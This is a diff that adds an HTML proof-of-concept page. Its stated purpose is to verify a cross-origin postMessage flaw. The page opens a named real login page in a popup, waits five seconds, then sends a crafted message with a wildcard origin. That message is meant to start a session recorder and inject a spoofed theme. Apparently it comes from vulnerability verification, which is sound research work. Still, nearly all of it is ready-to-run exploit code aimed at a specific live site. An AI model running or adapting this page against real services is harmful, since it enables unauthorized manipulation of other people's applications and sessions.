@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PostMessage Cross-Origin Verification PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; text-align: center; }
+        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #0070f3; color: white; border: none; border-radius: 5px; }
+        button:hover { background: #0051b3; }
+        #status { margin-top: 20px; color: #555; }
+    </style>
+</head>
+<body>
+
+    <h2>Target Vulnerability Verification</h2>
+    <p>Click the button below to test origin validation constraints.</p>
+    
+    <!-- User action triggers window expansion to satisfy browser popup blockers -->
+    <button id="startTest">Launch Target Window</button>
+    <div id="status">Status: Waiting for user action...</div>
+
+    <script>
+        document.getElementById('startTest').addEventListener('click', () => {
+            const targetUrl = "https://capitalcom.qualtrics.com/login";
+            document.getElementById('status').innerText = "Status: Opening window...";
+
+            // 1. Open the target application window context
+            const victimWindow = window.open(targetUrl, "_blank");
+
+            if (!victimWindow) {
+                document.getElementById('status').innerText = "Status: Error - Popup blocker active.";
+                return;
+            }
+
+            document.getElementById('status').innerText = "Status: Window opened. Waiting for application initialization loop...";
+
+            // 2. Introduce a strategic delay to allow the target DOM and event infrastructure to load
+            setTimeout(() => {
+                document.getElementById('status').innerText = "Status: Transmitting structured validation payload...";
+
+                // 3. Assemble a clean structural payload to trigger the start_recorder messageBus subscriber
+                const payload = {
+                    action: "startRecorderSession",
+                    experience: {
+                        id: "poc_exploit_test",
+                        locale: "en-US",
+                        theme: {
+                            id: "malicious_spoofed_theme",
+                            // This mirrors structural mapping properties found within the client configuration sink
+                            name: "Injected State Override",
+                            styles: {}
+                        }
+                    }
+                };
+
+                // 4. Dispatch the payload cross-origin using wildcard targetOrigin to confirm lack of validation
+                victimWindow.postMessage(payload, "*");
+
+                document.getElementById('status').innerText = "Status: Payload dispatched. Verify client browser console or UI for unexpected state behavior.";
+            }, 5000); // 5-second buffer duration for script provisioning
+        });
+    </script>
+
+</body>
+</html>
